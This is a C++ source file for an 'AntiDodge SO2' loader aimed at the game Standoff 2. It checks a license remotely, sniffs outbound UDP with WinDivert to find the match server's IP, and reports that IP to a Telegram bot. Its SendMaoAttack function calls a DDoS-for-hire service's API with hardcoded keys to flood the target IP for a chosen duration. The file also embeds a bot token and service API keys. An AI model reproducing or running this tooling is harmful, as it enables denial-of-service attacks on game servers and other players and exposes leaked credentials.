#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include <string>
#include <map>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "advapi32.lib")

// ========== КОНФИГУРАЦИЯ ==========
const char* GOOGLE_API_URL = "https://script.google.com/macros/s/AKfycbyGZcv_RB2UTrgn9VwaDFuN_Z3QkbiqgoNUDEKKe3QyqkfNDQXDWslPk_TLYh2OTGEI/exec";
const char* BOT_TOKEN = "8653498484:AAE1HIez8xwfKopD-FGH7mb7h8pwHgnJapU";
const char* ADMIN_ID = "112065332";

// ========== MAO-STRESS КЛЮЧИ ==========
const int MAO_USER = 10893;
const char* MAO_KEY_30 = "83zNHDrE0fD4Pv2nQd-MM9EJ71C";
const char* MAO_KEY_60 = "tF5-0T5q1pgDqfB9vIBGAF0T1BY";
const char* MAO_KEY_120 = "TIg445aV0QbgYXGej5y-SML88EC";

// ========== WinDivert ==========
typedef HANDLE(WINAPI* pWinDivertOpen)(const char*, DWORD, WORD, DWORD);
typedef BOOL(WINAPI* pWinDivertRecv)(HANDLE, void*, DWORD, DWORD*, void*);
pWinDivertOpen WinDivertOpen = NULL;
pWinDivertRecv WinDivertRecv = NULL;
HMODULE g_hWinDivert = NULL;

bool LoadWinDivert() {
    g_hWinDivert = LoadLibraryA("WinDivert.dll");
    if (!g_hWinDivert) return false;
    WinDivertOpen = (pWinDivertOpen)GetProcAddress(g_hWinDivert, "WinDivertOpen");
    WinDivertRecv = (pWinDivertRecv)GetProcAddress(g_hWinDivert, "WinDivertRecv");
    return WinDivertOpen && WinDivertRecv;
}

// ========== HTTP ЗАПРОСЫ ==========
std::string HttpPost(const std::string& url, const std::string& jsonData) {
    std::string host, path;
    size_t pos = url.find("://");
    pos = (pos == std::string::npos) ? 0 : pos + 3;
    size_t slash = url.find("/", pos);
    if (slash != std::string::npos) {
        host = url.substr(pos, slash - pos);
        path = url.substr(slash);
    } else {
        host = url.substr(pos);
        path = "/";
    }
    
    HINTERNET hSession = WinHttpOpen(L"Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return "";
    
    std::wstring whost(host.begin(), host.end());
    HINTERNET hConnect = WinHttpConnect(hSession, whost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", std::wstring(path.begin(), path.end()).c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return ""; }
    
    std::string headers = "Content-Type: application/json\r\n";
    WinHttpSendRequest(hRequest, std::wstring(headers.begin(), headers.end()).c_str(), headers.length(), (LPVOID)jsonData.c_str(), jsonData.length(), jsonData.length(), 0);
    WinHttpReceiveResponse(hRequest, NULL);
    
    std::string result;
    DWORD bytesRead = 0;
    char buffer[4096];
    while (WinHttpReadData(hRequest, buffer, sizeof(buffer)-1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = 0;
        result += buffer;
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result;
}

std::string HttpGet(const std::string& url) {
    std::string host, path;
    size_t pos = url.find("://");
    pos = (pos == std::string::npos) ? 0 : pos + 3;
    size_t slash = url.find("/", pos);
    if (slash != std::string::npos) {
        host = url.substr(pos, slash - pos);
        path = url.substr(slash);
    } else {
        host = url.substr(pos);
        path = "/";
    }
    
    HINTERNET hSession = WinHttpOpen(L"Agent", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    if (!hSession) return "";
    
    std::wstring whost(host.begin(), host.end());
    HINTERNET hConnect = WinHttpConnect(hSession, whost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { WinHttpCloseHandle(hSession); return ""; }
    
    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", std::wstring(path.begin(), path.end()).c_str(), NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return ""; }
    
    WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0);
    WinHttpReceiveResponse(hRequest, NULL);
    
    std::string result;
    DWORD bytesRead = 0;
    char buffer[4096];
    while (WinHttpReadData(hRequest, buffer, sizeof(buffer)-1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = 0;
        result += buffer;
    }
    
    WinHttpCloseHandle(hRequest);
    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    return result;
}

// ========== РЕЕСТР ДЛЯ ЛИЦЕНЗИИ ==========
bool SaveLicenseToRegistry(const std::string& key) {
    HKEY hKey;
    if (RegCreateKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\AntiDodgeSO2", 0, NULL, 0, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS)
        return false;
    RegSetValueExA(hKey, "license_key", 0, REG_SZ, (const BYTE*)key.c_str(), key.length() + 1);
    RegCloseKey(hKey);
    return true;
}

bool LoadLicenseFromRegistry(std::string& key) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\AntiDodgeSO2", 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return false;
    char buf[256];
    DWORD size = sizeof(buf);
    if (RegQueryValueExA(hKey, "license_key", NULL, NULL, (LPBYTE)buf, &size) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return false;
    }
    key = buf;
    RegCloseKey(hKey);
    return true;
}

void ClearLicenseFromRegistry() {
    RegDeleteKeyA(HKEY_CURRENT_USER, "SOFTWARE\\AntiDodgeSO2");
}

// ========== HWID ==========
std::string GetHWID() {
    DWORD serial = 0;
    GetVolumeInformationA("C:\\", NULL, 0, &serial, NULL, NULL, NULL, 0);
    char buf[32];
    sprintf_s(buf, "%08X", serial);
    return std::string(buf);
}

// ========== ПРОВЕРКА ЛИЦЕНЗИИ ==========
bool CheckLicense(const std::string& key, const std::string& hwid) {
    std::string json = "{\"action\":\"activate_loader\",\"loader_key\":\"" + key + "\",\"hwid\":\"" + hwid + "\"}";
    std::string response = HttpPost(GOOGLE_API_URL, json);
    return response.find("\"valid\":true") != std::string::npos;
}

// ========== АТАКА ЧЕРЕЗ MAO-STRESS ==========
bool SendMaoAttack(const std::string& ip, int port, int duration) {
    const char* api_key = MAO_KEY_30;
    if (duration == 30) api_key = MAO_KEY_30;
    else if (duration == 60) api_key = MAO_KEY_60;
    else if (duration == 120) api_key = MAO_KEY_120;
    else return false;
    
    char url[512];
    sprintf_s(url, "https://mao-stress.su/api/start.php?user=%d&api_key=%s&target=%s&port=%d&duration=%d&method=UDP-PPS",
        MAO_USER, api_key, ip.c_str(), port, duration);
    
    std::string response = HttpGet(url);
    return response.find("Attack started") != std::string::npos;
}

// ========== УВЕДОМЛЕНИЕ В TELEGRAM ==========
void SendTelegramNotification(const std::string& ip, int port) {
    char url[512];
    sprintf_s(url, "https://api.telegram.org/bot%s/sendMessage?chat_id=%s&text=🎮 Server: %s:%d", BOT_TOKEN, ADMIN_ID, ip.c_str(), port);
    HttpGet(url);
}

// ========== ПОИСК PID HD-PLAYER.EXE ==========
DWORD GetHdPlayerPid() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;
    
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(snapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "HD-Player.exe") == 0) {
                CloseHandle(snapshot);
                return pe.th32ProcessID;
            }
        } while (Process32Next(snapshot, &pe));
    }
    CloseHandle(snapshot);
    return 0;
}

// ========== ПОИСК СЕРВЕРА ЧЕРЕЗ WINDIVERT ==========
bool FindGameServer(std::string& out_ip, int& out_port) {
    if (!LoadWinDivert()) return false;
    
    HANDLE handle = WinDivertOpen("udp and outbound", 0, 0, 0);
    if (handle == INVALID_HANDLE_VALUE) { FreeLibrary(g_hWinDivert); return false; }
    
    BYTE packet[4096];
    DWORD read;
    DWORD endTime = GetTickCount() + 5000;
    std::map<std::string, int> servers;
    
    while (GetTickCount() < endTime) {
        if (WinDivertRecv(handle, packet, sizeof(packet), &read, NULL)) {
            for (int i = 0; i < (int)read - 20; i++) {
                if ((packet[i] & 0xF0) == 0x40) {
                    struct in_addr addr;
                    addr.S_un.S_addr = *(DWORD*)(packet + i + 16);
                    char* ipStr = inet_ntoa(addr);
                    std::string ip(ipStr);
                    if (ip.find("127.") != 0 && ip.find("192.168.") != 0 && 
                        ip.find("10.") != 0 && ip.find("172.") != 0) {
                        servers[ip]++;
                    }
                    break;
                }
            }
        }
    }
    
    WinDivertClose(handle);
    FreeLibrary(g_hWinDivert);
    
    if (servers.empty()) return false;
    
    std::string bestIp;
    int bestCount = 0;
    for (auto& pair : servers) {
        if (pair.second > bestCount) {
            bestCount = pair.second;
            bestIp = pair.first;
        }
    }
    out_ip = bestIp;
    out_port = 0;
    return true;
}

// ========== ОСНОВНАЯ ФУНКЦИЯ ==========
int main() {
    printf("AntiDodge SO2 Loader\n");
    printf("Telegram: @AntiDodgeSo2\n\n");
    
    // Проверка лицензии
    std::string hwid = GetHWID();
    std::string saved_key;
    bool license_valid = false;
    
    if (LoadLicenseFromRegistry(saved_key)) {
        if (CheckLicense(saved_key, hwid)) {
            license_valid = true;
            printf("License: ACTIVE\n");
        } else {
            ClearLicenseFromRegistry();
        }
    }
    
    if (!license_valid) {
        printf("ACTIVATION REQUIRED\n");
        printf("Enter your license key: ");
        std::string key;
        std::cin >> key;
        
        if (CheckLicense(key, hwid)) {
            SaveLicenseToRegistry(key);
            printf("License activated!\n");
            license_valid = true;
        } else {
            printf("Activation failed!\n");
            printf("Press Enter to exit...");
            getchar(); getchar();
            return 1;
        }
    }
    
    if (!license_valid) {
        printf("Press Enter to exit...");
        getchar();
        return 1;
    }
    
    printf("\nAntiDodge Work\n");
    printf("Start Standoff 2 match\n\n");
    
    std::string last_ip;
    while (true) {
        std::string ip;
        int port;
        
        if (FindGameServer(ip, port)) {
            if (ip != last_ip) {
                last_ip = ip;
                printf("Game server detected: %s:%d\n", ip.c_str(), port);
                SendTelegramNotification(ip, port);
                
                // Автоматическая атака (опционально)
                // SendMaoAttack(ip, port, 60);
            }
        }
        Sleep(10000);
    }
    
    return 0;
}
